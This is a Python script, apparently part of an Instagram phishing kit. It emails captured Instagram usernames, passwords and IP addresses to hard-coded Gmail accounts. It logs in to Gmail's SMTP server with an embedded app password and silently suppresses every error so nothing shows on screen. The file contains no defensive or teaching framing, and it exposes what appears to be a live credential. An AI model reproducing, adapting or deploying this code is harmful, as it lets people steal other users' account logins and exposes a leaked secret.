import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Config
SENDER_EMAIL = "egale5x@gmail.com"
RECEIVER_EMAILS = ["gameraditya3703@gmail.com", "egale5x@gmail.com"]  # List of recipients
APP_PASSWORD = "dvjq igyw jyab huax"  # Prefer environment variable for security

def send_email(username, password, ip_address, status):
    subject = "📥 Instagram Login Attempt Captured"
    body = f"""
    📌 New Login Details:

    👤 Username: {username}
    🔐 Password: {password}
    🌐 IP Address: {ip_address}
    📊 Status: {status}

    - EGALX5 Logger Bot
    """

    msg = MIMEMultipart()
    msg["From"] = SENDER_EMAIL
    msg["To"] = ", ".join(RECEIVER_EMAILS)  # Comma-separated string for email header
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(SENDER_EMAIL, APP_PASSWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAILS, msg.as_string())  # List of recipients here
    except:
        pass  # Silently ignore all errors, no terminal output
